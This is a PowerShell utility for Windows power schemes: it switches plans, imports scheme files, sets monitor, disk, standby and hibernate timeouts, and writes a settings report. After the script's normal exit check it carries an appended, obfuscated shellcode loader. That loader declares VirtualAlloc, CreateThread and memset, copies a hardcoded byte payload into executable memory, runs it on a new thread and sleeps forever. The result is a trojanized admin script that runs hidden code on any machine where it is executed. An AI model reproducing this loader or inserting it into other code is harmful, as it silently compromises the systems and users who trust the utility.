
[CmdletBinding()]
param
(
	[switch]
	$Balanced,
	[string]
	$ConsoleTitle = 'PowerScheme',
	[string]
	$Custom,
	[switch]
	$HighPerformance,
	[string]
	$ImportPowerSchemeFile,
	[switch]
	$PowerSaver,
	[string]
	$PowerSchemeName,
	[switch]
	$Report,
	[ValidateSet('MonitorTimeoutAC', 'MonitorTimeoutDC', 'DiskTimeoutAC', 'DiskTimeoutDC', 'StandbyTimeoutAC', 'StandbyTimeoutDC', 'HibernateTimeoutAC', 'HibernateTimeoutDC')][string]
	$SetPowerSchemeSetting,
	[string]
	$SetPowerSchemeSettingValue,
	[switch]
	$SetImportedPowerSchemeDefault
)

function Get-PowerScheme {

	
	[CmdletBinding()][OutputType([object])]
	param ()
	
	
	$Query = powercfg.exe /getactivescheme
	
	$ActiveSchemeName = ($Query.Split("()").Trim())[1]
	
	$ActiveSchemeGUID = ($Query.Split(":(").Trim())[1]
	$Query = powercfg.exe /query $ActiveSchemeGUID
	$GUIDAlias = ($Query | where { $_.Contains("GUID Alias:") }).Split(":")[1].Trim()
	$Scheme = New-Object -TypeName PSObject
	$Scheme | Add-Member -Type NoteProperty -Name PowerScheme -Value $ActiveSchemeName
	$Scheme | Add-Member -Type NoteProperty -Name GUIDAlias -Value $GUIDAlias
	$Scheme | Add-Member -Type NoteProperty -Name GUID -Value $ActiveSchemeGUID
	Return $Scheme
}

function Get-PowerSchemeSubGroupSettings {

	
	[CmdletBinding()]
	param
	(
		[ValidateNotNullOrEmpty()]$Subgroup,
		[ValidateNotNullOrEmpty()][object]
		$ActivePowerScheme
	)
	
	$Query = powercfg.exe /query $ActivePowerScheme.GUID $Subgroup.GUID
	$Query = $Query | where { ((!($_.Contains($ActivePowerScheme.GUID))) -and (!($_.Contains($ActivePowerScheme.GUIDAlias)))) }
	$Settings = @()
	For ($i = 0; $i -lt $Query.Length; $i++) {
		If ($Query[$i] -like "*Power Setting GUID:*") {
			$Setting = New-Object System.Object
			
			$SettingName = $Query[$i].Split("()").Trim()
			$SettingName = $SettingName[1]
			
			If ($Query[$i + 1] -like "*GUID Alias:*") {
				$SettingAlias = $Query[$i + 1].Split(":").Trim()
				$SettingAlias = $SettingAlias[1]
			} else {
				$SettingAlias = $null
			}
			
			$SettingGUID = $Query[$i].Split(":(").Trim()
			$SettingGUID = $SettingGUID[1]
			
			$j = $i
			Do {
				$j++
			}
			while ($Query[$j] -notlike "*Current AC Power Setting*")
			$SettingAC = $Query[$j].Split(":").Trim()
			$SettingAC = [Convert]::ToInt32($SettingAC[1], 16)
			$SettingDC = $Query[$j + 1].Split(":").Trim()
			$SettingDC = [Convert]::ToInt32($SettingDC[1], 16)
			$Setting | Add-Member -Type NoteProperty -Name Subgroup -Value $Subgroup.Subgroup
			$Setting | Add-Member -Type NoteProperty -Name Name -Value $SettingName
			$Setting | Add-Member -Type NoteProperty -Name Alias -Value $SettingAlias
			$Setting | Add-Member -Type NoteProperty -Name GUID -Value $SettingGUID
			$Setting | Add-Member -Type NoteProperty -Name AC -Value $SettingAC
			$Setting | Add-Member -Type NoteProperty -Name DC -Value $SettingDC
			$Settings += $Setting
		}
	}
	Return $Settings
}

function Get-RelativePath {

	
	[CmdletBinding()][OutputType([string])]
	param ()
	
	$Path = (split-path $SCRIPT:MyInvocation.MyCommand.Path -parent) + "\"
	Return $Path
}

function Get-SubGroupsList {

	
	[CmdletBinding()][OutputType([object])]
	param
	(
		[ValidateNotNullOrEmpty()][object]
		$ActivePowerScheme
	)
	
	
	$Query = powercfg.exe /query $ActivePowerScheme.GUID
	
	$Subgroups = @()
	for ($i = 0; $i -lt $Query.Length; $i++) {
		If (($Query[$i] -like "*Subgroup GUID:*") -and ($Query[$i + 1] -notlike "*Subgroup GUID:*")) {
			$Subgroup = New-Object System.Object
			$SubgroupName = $Query[$i].Split("()").Trim()
			$SubgroupName = $SubgroupName[1]
			If ($Query[$i + 1] -like "*GUID Alias:*") {
				$SubgroupAlias = $Query[$i + 1].Split(":").Trim()
				$SubgroupAlias = $SubgroupAlias[1]
			} else {
				$SubgroupAlias = $null
			}
			$SubgroupGUID = $Query[$i].Split(":(").Trim()
			$SubgroupGUID = $SubgroupGUID[1]
			$Subgroup | Add-Member -Type NoteProperty -Name Subgroup -Value $SubgroupName
			$Subgroup | Add-Member -Type NoteProperty -Name Alias -Value $SubgroupAlias
			$Subgroup | Add-Member -Type NoteProperty -Name GUID -Value $SubgroupGUID
			$Subgroups += $Subgroup
		}
	}
	Return $Subgroups
}

function Import-PowerScheme {

	
	[CmdletBinding()][OutputType([boolean])]
	param
	(
		[ValidateNotNullOrEmpty()][string]
		$File,
		[ValidateNotNullOrEmpty()][string]
		$PowerSchemeName,
		[switch]
		$SetActive
	)
	
	$RelativePath = Get-RelativePath
	$File = $RelativePath + $File
	
	$OldPowerSchemes = powercfg.exe /l
	
	$OldPowerSchemes = $OldPowerSchemes | where { $_ -like "*Power Scheme GUID*" } | ForEach-Object { $_ -replace "Power Scheme GUID: ", "" } | ForEach-Object { ($_.split("?("))[0] }
	Write-Host "Importing Power Scheme....." -NoNewline
	
	$Output = powercfg.exe -import $File
	
	$NewPowerSchemes = powercfg.exe /l
	
	$NewScheme = $NewPowerSchemes | where { $_ -like "*Power Scheme GUID*" } | ForEach-Object { $_ -replace "Power Scheme GUID: ", "" } | ForEach-Object { ($_.split("?("))[0] } | where { $OldPowerSchemes -notcontains $_ }
	If ($NewScheme -ne $null) {
		Write-Host "Success" -ForegroundColor Yellow
		$Error = $false
	} else {
		Write-Host "Failed" -ForegroundColor Red
		$Error = $true
	}
	
	Write-Host "Renaming imported power scheme to"$PowerSchemeName"....." -NoNewline
	$Switches = "/changename" + [char]32 + $NewScheme.Trim() + [char]32 + [char]34 + $PowerSchemeName + [char]34
	$ErrCode = (Start-Process -FilePath "powercfg.exe" -ArgumentList $Switches -WindowStyle Minimized -Wait -Passthru).ExitCode
	$NewPowerSchemes = powercfg.exe /l
	If ($ErrCode -eq 0) {
		$Test = $NewPowerSchemes | where { $_ -like ("*" + $PowerSchemeName + "*") }
		If ($Test -ne $null) {
			Write-Host "Success" -ForegroundColor Yellow
			$Error = $false
		} else {
			Write-Host "Failed" -ForegroundColor Red
			$Error = $true
			Return $Error
		}
	}
	Write-Host "Setting"$PowerSchemeName" to default....." -NoNewline
	$Switches = "-setactive " + $NewScheme.Trim()
	$ErrCode = (Start-Process -FilePath "powercfg.exe" -ArgumentList $Switches -WindowStyle Minimized -Wait -Passthru).ExitCode
	$Query = powercfg.exe /getactivescheme
	
	$ActiveSchemeName = (powercfg.exe /getactivescheme).Split("()").Trim()[1]
	If ($ActiveSchemeName -eq $PowerSchemeName) {
		Write-Host "Success" -ForegroundColor Yellow
		$Error = $false
	} else {
		Write-Host "Failed" -ForegroundColor Red
		$Error = $true
	}
	Return $Error
}

function Publish-Report {

	
	[CmdletBinding()]
	param ()
	
	
	$RelativePath = Get-RelativePath
	
	$ActivePowerScheme = Get-PowerScheme
	
	$PowerSchemeSubGroups = Get-SubGroupsList -ActivePowerScheme $ActivePowerScheme
	
	$PowerSchemeSettings = @()
	for ($i = 0; $i -lt $PowerSchemeSubGroups.Length; $i++) {
		$PowerSchemeSubGroupSettings = Get-PowerSchemeSubGroupSettings -ActivePowerScheme $ActivePowerScheme -Subgroup $PowerSchemeSubGroups[$i]
		$PowerSchemeSettings += $PowerSchemeSubGroupSettings
	}
	
	$ReportFile = $RelativePath + "PowerSchemeReport.txt"
	
	If ((Test-Path $ReportFile) -eq $true) {
		Remove-Item -Path $ReportFile -Force
	}
	
	$Header = "ACTIVE POWER SCHEME REPORT"
	$Header | Tee-Object -FilePath $ReportFile -Append
	$Header = "--------------------------------------------------------------------------------"
	$Header | Tee-Object -FilePath $ReportFile -Append
	
	$Output = $ActivePowerScheme | Format-Table
	
	$Output | Tee-Object -FilePath $ReportFile -Append
	
	$Header = "POWER SCHEME SUBGROUPS REPORT"
	$Header | Tee-Object -FilePath $ReportFile -Append
	$Header = "--------------------------------------------------------------------------------"
	$Header | Tee-Object -FilePath $ReportFile -Append
	$Output = $PowerSchemeSubgroups | Format-Table
	
	$Output | Tee-Object -FilePath $ReportFile -Append
	
	$Header = "POWER SCHEME SUBGROUP SETTINGS REPORT"
	$Header | Tee-Object -FilePath $ReportFile -Append
	$Header = "--------------------------------------------------------------------------------"
	$Header | Tee-Object -FilePath $ReportFile -Append
	$Output = $PowerSchemeSettings | Format-Table
	
	$Output | Tee-Object -FilePath $ReportFile -Append
}

function Set-ConsoleTitle {

	
	[CmdletBinding()]
	param
	(
		[Parameter(Mandatory = $true)][String]
		$Title
	)
	
	$host.ui.RawUI.WindowTitle = $Title
}

function Set-PowerScheme {

	
	[CmdletBinding()][OutputType([boolean])]
	param
	(
		[ValidateSet('Balanced', 'High Performance', 'Power Saver')][string]
		$PowerScheme,
		[string]
		$CustomPowerScheme
	)
	
	
	$PowerSchemes = powercfg.exe /l
	If ($PowerScheme -ne $null) {
		
		$PowerSchemes = ($PowerSchemes | where { $_ -like "*" + $PowerScheme + "*" }).Split(":(").Trim()[1]
		
		$ActivePowerScheme = Get-PowerScheme
		$ActivePowerScheme.PowerScheme
		Write-Host "Setting Power Scheme from"$ActivePowerScheme.PowerScheme"to"$PowerScheme"....." -NoNewline
		$Output = powercfg.exe -setactive $PowerSchemes
		$ActivePowerScheme = Get-PowerScheme
		If ($PowerScheme -eq $ActivePowerScheme.PowerScheme) {
			Write-Host "Success" -ForegroundColor Yellow
			Return $false
		} else {
			Write-Host "Failed" -ForegroundColor Red
			Return $true
		}
	}
}

function Set-PowerSchemeSettings {

	
	[CmdletBinding()]
	param
	(
		[string]
		$MonitorTimeoutAC,
		[string]
		$MonitorTimeoutDC,
		[string]
		$DiskTimeoutAC,
		[string]
		$DiskTimeoutDC,
		[string]
		$StandbyTimeoutAC,
		[string]
		$StandbyTimeoutDC,
		[string]
		$HibernateTimeoutAC,
		[string]
		$HibernateTimeoutDC
	)
	
	$Scheme = Get-PowerScheme
	If (($MonitorTimeoutAC -ne $null) -and ($MonitorTimeoutAC -ne "")) {
		Write-Host "Setting monitor timeout on AC to"$MonitorTimeoutAC" minutes....." -NoNewline
		$Switches = "/change" + [char]32 + "monitor-timeout-ac" + [char]32 + $MonitorTimeoutAC
		$TestKey = "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power\User\PowerSchemes\" + $Scheme.GUID + "\7516b95f-f776-4464-8c53-06167f40cc99\3c0bc021-c8a8-4e07-a973-6b14cbcb2b7e"
		$TestValue = $MonitorTimeoutAC
		$PowerIndex = "ACSettingIndex"
	}
	If (($MonitorTimeoutDC -ne $null) -and ($MonitorTimeoutDC -ne "")) {
		Write-Host "Setting monitor timeout on DC to"$MonitorTimeoutDC" minutes....." -NoNewline
		$Switches = "/change" + [char]32 + "monitor-timeout-dc" + [char]32 + $MonitorTimeoutDC
		$TestKey = "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power\User\PowerSchemes\" + $Scheme.GUID + "\7516b95f-f776-4464-8c53-06167f40cc99\3c0bc021-c8a8-4e07-a973-6b14cbcb2b7e"
		$TestValue = $MonitorTimeoutDC
		$PowerIndex = "DCSettingIndex"
	}
	If (($DiskTimeoutAC -ne $null) -and ($DiskTimeoutAC -ne "")) {
		Write-Host "Setting disk timeout on AC to"$DiskTimeoutAC" minutes....." -NoNewline
		$Switches = "/change" + [char]32 + "disk-timeout-ac" + [char]32 + $DiskTimeoutAC
		$TestKey = "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power\User\PowerSchemes\" + $Scheme.GUID + "\0012ee47-9041-4b5d-9b77-535fba8b1442\6738e2c4-e8a5-4a42-b16a-e040e769756e"
		$TestValue = $DiskTimeoutAC
		$PowerIndex = "ACSettingIndex"
	}
	If (($DiskTimeoutDC -ne $null) -and ($DiskTimeoutDC -ne "")) {
		Write-Host "Setting disk timeout on DC to"$DiskTimeoutDC" minutes....." -NoNewline
		$Switches = "/change" + [char]32 + "disk-timeout-dc" + [char]32 + $DiskTimeoutDC
		$TestKey = "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power\User\PowerSchemes\" + $Scheme.GUID + "\0012ee47-9041-4b5d-9b77-535fba8b1442\6738e2c4-e8a5-4a42-b16a-e040e769756e"
		$TestValue = $DiskTimeoutDC
		$PowerIndex = "DCSettingIndex"
	}
	If (($StandbyTimeoutAC -ne $null) -and ($StandbyTimeoutAC -ne "")) {
		Write-Host "Setting standby timeout on AC to"$StandbyTimeoutAC" minutes....." -NoNewline
		$Switches = "/change" + [char]32 + "standby-timeout-ac" + [char]32 + $StandbyTimeoutAC
		$TestKey = "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power\User\PowerSchemes\" + $Scheme.GUID + "\238c9fa8-0aad-41ed-83f4-97be242c8f20\29f6c1db-86da-48c5-9fdb-f2b67b1f44da"
		$TestValue = $StandbyTimeoutAC
		$PowerIndex = "ACSettingIndex"
	}
	If (($StandbyTimeoutDC -ne $null) -and ($StandbyTimeoutDC -ne "")) {
		Write-Host "Setting standby timeout on DC to"$StandbyTimeoutDC" minutes....." -NoNewline
		$Switches = "/change" + [char]32 + "standby-timeout-dc" + [char]32 + $StandbyTimeoutDC
		$TestKey = "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power\User\PowerSchemes\" + $Scheme.GUID + "\238c9fa8-0aad-41ed-83f4-97be242c8f20\29f6c1db-86da-48c5-9fdb-f2b67b1f44da"
		$TestValue = $StandbyTimeoutDC
		$PowerIndex = "DCSettingIndex"
	}
	If (($HibernateTimeoutAC -ne $null) -and ($HibernateTimeoutAC -ne "")) {
		Write-Host "Setting hibernate timeout on AC to"$HibernateTimeoutAC" minutes....." -NoNewline
		$Switches = "/change" + [char]32 + "hibernate-timeout-ac" + [char]32 + $HibernateTimeoutAC
		$TestKey = "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power\User\PowerSchemes\" + $Scheme.GUID + "\238c9fa8-0aad-41ed-83f4-97be242c8f20\9d7815a6-7ee4-497e-8888-515a05f02364"
		[int]$TestValue = $HibernateTimeoutAC
		$PowerIndex = "ACSettingIndex"
	}
	If (($HibernateTimeoutDC -ne $null) -and ($HibernateTimeoutDC -ne "")) {
		Write-Host "Setting hibernate timeout on DC to"$HibernateTimeoutDC" minutes....." -NoNewline
		$Switches = "/change" + [char]32 + "hibernate-timeout-dc" + [char]32 + $HibernateTimeoutDC
		$TestKey = "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power\User\PowerSchemes\" + $Scheme.GUID + "\238c9fa8-0aad-41ed-83f4-97be242c8f20\9d7815a6-7ee4-497e-8888-515a05f02364"
		$TestValue = $HibernateTimeoutDC
		$PowerIndex = "DCSettingIndex"
	}
	$ErrCode = (Start-Process -FilePath "powercfg.exe" -ArgumentList $Switches -WindowStyle Minimized -Wait -Passthru).ExitCode
	$RegValue = (((Get-ItemProperty $TestKey).$PowerIndex) /60)
	
	$RegValue = $RegValue - ($RegValue % 10)
	If (($RegValue -eq $TestValue) -and ($ErrCode -eq 0)) {
		Write-Host "Success" -ForegroundColor Yellow
		$Errors = $false
	} else {
		Write-Host "Failed" -ForegroundColor Red
		$Errors = $true
	}
	Return $Errors
}


cls

$Errors = $false

Set-ConsoleTitle -Title $ConsoleTitle




If ($Report.IsPresent) {
	Publish-Report
}

If ($Balanced.IsPresent) {
	$Errors = Set-PowerScheme -PowerScheme 'Balanced'
}

If ($PowerSaver.IsPresent) {
	$Errors = Set-PowerScheme -PowerScheme 'Power Saver'
}

If ($HighPerformance.IsPresent) {
	$Errors = Set-PowerScheme -PowerScheme 'High Performance'
}

If (($Custom -ne $null) -and ($Custom -ne "")) {
	$Errors = Set-PowerScheme -PowerScheme $Custom
}

If (($ImportPowerSchemeFile -ne $null) -and ($ImportPowerSchemeFile -ne "")) {
	If ($SetImportedPowerSchemeDefault.IsPresent) {
		$Errors = Import-PowerScheme -File $ImportPowerSchemeFile -PowerSchemeName $PowerSchemeName -SetActive
	} else {
		$Errors = Import-PowerScheme -File $ImportPowerSchemeFile -PowerSchemeName $PowerSchemeName
	}
}

If (($SetPowerSchemeSetting -ne $null) -and ($SetPowerSchemeSetting -ne "")) {
	switch ($SetPowerSchemeSetting) {
		"MonitorTimeoutAC" { $Errors = Set-PowerSchemeSettings -MonitorTimeoutAC $SetPowerSchemeSettingValue }
		"MonitorTimeoutDC" { $Errors = Set-PowerSchemeSettings -MonitorTimeoutDC $SetPowerSchemeSettingValue }
		"DiskTimeOutAC" { $Errors = Set-PowerSchemeSettings -DiskTimeOutAC $SetPowerSchemeSettingValue }
		"DiskTimeOutDC" { $Errors = Set-PowerSchemeSettings -DiskTimeOutDC $SetPowerSchemeSettingValue }
		"StandbyTimeoutAC" { $Errors = Set-PowerSchemeSettings -StandbyTimeoutAC $SetPowerSchemeSettingValue }
		"StandbyTimeoutDC" { $Errors = Set-PowerSchemeSettings -StandbyTimeoutDC $SetPowerSchemeSettingValue }
		"HibernateTimeoutAC" { $Errors = Set-PowerSchemeSettings -HibernateTimeoutAC $SetPowerSchemeSettingValue }
		"HibernateTimeoutDC" { $Errors = Set-PowerSchemeSettings -HibernateTimeoutDC $SetPowerSchemeSettingValue }
	}
}

If ($Errors -eq $true) {
	Exit 5
}

$mpJl = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $mpJl -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbd,0x1d,0x70,0x91,0x51,0xdb,0xcd,0xd9,0x74,0x24,0xf4,0x5a,0x29,0xc9,0xb1,0x47,0x83,0xc2,0x04,0x31,0x6a,0x0f,0x03,0x6a,0x12,0x92,0x64,0xad,0xc4,0xd0,0x87,0x4e,0x14,0xb5,0x0e,0xab,0x25,0xf5,0x75,0xbf,0x15,0xc5,0xfe,0xed,0x99,0xae,0x53,0x06,0x2a,0xc2,0x7b,0x29,0x9b,0x69,0x5a,0x04,0x1c,0xc1,0x9e,0x07,0x9e,0x18,0xf3,0xe7,0x9f,0xd2,0x06,0xe9,0xd8,0x0f,0xea,0xbb,0xb1,0x44,0x59,0x2c,0xb6,0x11,0x62,0xc7,0x84,0xb4,0xe2,0x34,0x5c,0xb6,0xc3,0xea,0xd7,0xe1,0xc3,0x0d,0x34,0x9a,0x4d,0x16,0x59,0xa7,0x04,0xad,0xa9,0x53,0x97,0x67,0xe0,0x9c,0x34,0x46,0xcd,0x6e,0x44,0x8e,0xe9,0x90,0x33,0xe6,0x0a,0x2c,0x44,0x3d,0x71,0xea,0xc1,0xa6,0xd1,0x79,0x71,0x03,0xe0,0xae,0xe4,0xc0,0xee,0x1b,0x62,0x8e,0xf2,0x9a,0xa7,0xa4,0x0e,0x16,0x46,0x6b,0x87,0x6c,0x6d,0xaf,0xcc,0x37,0x0c,0xf6,0xa8,0x96,0x31,0xe8,0x13,0x46,0x94,0x62,0xb9,0x93,0xa5,0x28,0xd5,0x50,0x84,0xd2,0x25,0xff,0x9f,0xa1,0x17,0xa0,0x0b,0x2e,0x1b,0x29,0x92,0xa9,0x5c,0x00,0x62,0x25,0xa3,0xab,0x93,0x6f,0x67,0xff,0xc3,0x07,0x4e,0x80,0x8f,0xd7,0x6f,0x55,0x25,0xdd,0xe7,0x02,0x4f,0xd6,0xb7,0xc2,0xad,0xe9,0x26,0x4f,0x3b,0x0f,0x18,0x3f,0x6b,0x80,0xd8,0xef,0xcb,0x70,0xb0,0xe5,0xc3,0xaf,0xa0,0x05,0x0e,0xd8,0x4a,0xea,0xe7,0xb0,0xe2,0x93,0xad,0x4b,0x93,0x5c,0x78,0x36,0x93,0xd7,0x8f,0xc6,0x5d,0x10,0xe5,0xd4,0x09,0xd0,0xb0,0x87,0x9f,0xef,0x6e,0xad,0x1f,0x7a,0x95,0x64,0x48,0x12,0x97,0x51,0xbe,0xbd,0x68,0xb4,0xb5,0x74,0xfd,0x77,0xa1,0x78,0x11,0x78,0x31,0x2f,0x7b,0x78,0x59,0x97,0xdf,0x2b,0x7c,0xd8,0xf5,0x5f,0x2d,0x4d,0xf6,0x09,0x82,0xc6,0x9e,0xb7,0xfd,0x21,0x01,0x47,0x28,0xb0,0x7d,0x9e,0x14,0xc6,0x6f,0x22;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$xH0U=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($xH0U.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$xH0U,0,0,0);for (;;){Start-sleep 60};

